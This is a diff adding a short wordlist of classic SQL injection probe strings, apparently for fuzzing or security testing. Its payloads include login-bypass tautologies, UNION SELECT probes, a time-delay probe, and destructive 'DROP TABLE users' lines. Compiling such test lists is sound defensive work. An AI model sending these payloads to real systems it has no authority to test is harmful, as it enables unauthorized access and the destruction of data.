@@ -1,0 +1,15 @@
+# Classic SQLi probe strings. One payload per line.
+' OR 1=1--
+' OR '1'='1
+"; DROP TABLE
+" OR 1=1--
+1; DROP TABLE users--
+' UNION SELECT NULL--
+'; WAITFOR DELAY '0:0:5'--
+admin'--
+1' AND '1'='1
+' OR 'x'='x
+'; DROP TABLE users; --
+') OR ('1'='1
+1 OR 1=1
+' OR 1=1#
